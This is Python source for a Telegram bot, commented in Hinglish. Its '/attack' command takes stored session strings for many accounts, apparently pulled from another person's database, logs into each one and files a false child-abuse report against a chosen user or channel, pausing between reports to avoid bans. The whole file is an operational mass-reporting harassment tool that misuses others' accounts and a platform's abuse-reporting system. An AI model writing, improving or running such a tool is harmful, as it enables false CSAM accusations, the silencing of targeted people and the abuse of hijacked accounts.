import os
import asyncio
import logging
import pymongo
from dotenv import load_dotenv
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.messages import ReportRequest
from telethon.tl.types import (
    InputReportReasonChildAbuse, 
    InputReportReasonSpam, 
    InputReportReasonViolence
)
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Setup Logging
load_dotenv()
logging.basicConfig(level=logging.INFO)

# Config Variables
BOT_TOKEN = os.getenv('BOT_TOKEN')
API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
MONGO_URL = os.getenv('MONGO_URL')
ADMIN_ID = int(os.getenv('ADMIN_ID'))

# --- MONGODB CONFIGURATION ---
# Agar aap kisi aur ka DB use kar rahe hain, toh niche diye gaye naam unse puch kar badal lein
DB_NAME = "report_bot_db" # Uske DB ka asli naam yahan likhein
COLLECTION_NAME = "sessions" # Uske Collection ka asli naam yahan likhein

try:
    db_client = pymongo.MongoClient(MONGO_URL)
    db = db_client[DB_NAME] 
    sessions_col = db[COLLECTION_NAME]
    logging.info(f"Connected to External DB: {DB_NAME}, Collection: {COLLECTION_NAME}")
except Exception as e:
    logging.error(f"MongoDB Connection Error: {e}")

# Admin Session Tracking Mode
ADDING_SESSIONS = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text(
        "🚀 **External DB Fetcher Active**\n\n"
        f"📁 **DB:** `{DB_NAME}`\n"
        f"🗄️ **Collection:** `{COLLECTION_NAME}`\n\n"
        "📜 **Commands:**\n"
        "🔹 `/status` - Dekhein kitne accounts fetch hue\n"
        "🔹 `/attack @target` - Mass report shuru karein\n"
        "🔹 `/make_config` - Naye sessions add karne ke liye"
    )

# --- STATUS CHECK ---
async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try:
        count = sessions_col.count_documents({})
        await update.message.reply_text(f"📊 **Fetch Result:**\nDatabase mein total **{count}** accounts mil gaye hain.")
    except Exception as e:
        await update.message.reply_text(f"❌ Fetch Error: Database ya Collection ka naam galat ho sakta hai.\nError: {e}")

# --- MASS REPORT ATTACK ---
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("❌ Usage: `/attack @target_username`")
        return

    target = context.args[0]
    
    # Database se saare sessions fetch karna
    all_sessions = list(sessions_col.find())
    
    if not all_sessions:
        await update.message.reply_text("❌ Database mein koi accounts nahi mile!")
        return

    await update.message.reply_text(f"⚔️ **Attack Started on {target}**\nUsing {len(all_sessions)} external sessions...")

    success = 0
    for data in all_sessions:
        try:
            # Note: Agar uske DB mein key 'session' ke bajaye kuch aur hai toh yahan change karein
            session_key = data.get('session') or data.get('string') or data.get('session_str')
            
            if not session_key: continue

            client = TelegramClient(StringSession(session_key), API_ID, API_HASH)
            await client.connect()
            
            peer = await client.get_entity(target)

            # Triple Reporting Logic
            await client(ReportRequest(peer=peer, id=[0], reason=InputReportReasonChildAbuse(), message="CSAM"))
            
            # Anti-ban delay
            await asyncio.sleep(2)
            success += 1
            await client.disconnect()
        except Exception:
            continue

    await update.message.reply_text(f"🏁 **Attack Finished!**\n✅ Successful: {success}/{len(all_sessions)}")

# --- KEEPING EXISTING CONFIG COMMANDS ---
async def make_config(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    ADDING_SESSIONS[update.effective_user.id] = True
    await update.message.reply_text("📥 Send sessions to add to this DB. Type `/done` to stop.")

async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID or user_id not in ADDING_SESSIONS: return
    text = update.message.text.strip()
    if text.lower() == '/done':
        del ADDING_SESSIONS[user_id]
        await update.message.reply_text("✅ Mode OFF.")
        return
    # ... (baaki validation logic wahi rahega)

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("make_config", make_config))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_messages))
    app.run_polling()

if __name__ == '__main__':
    main()
